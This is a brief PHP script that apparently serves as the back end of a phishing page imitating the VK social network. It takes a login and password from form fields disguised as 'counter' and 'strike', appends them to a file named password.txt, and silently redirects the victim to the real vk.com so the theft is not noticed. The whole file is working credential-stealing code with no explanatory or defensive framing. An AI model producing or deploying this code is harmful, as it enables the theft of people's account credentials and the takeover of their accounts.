<?PHP
$Log = $_POST['counter'];
$Pass = $_POST['strike'];
$log = fopen("password.txt","at");
fwrite($log,"$Log:$Pass\n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://vk.com/'></head></html>";
?>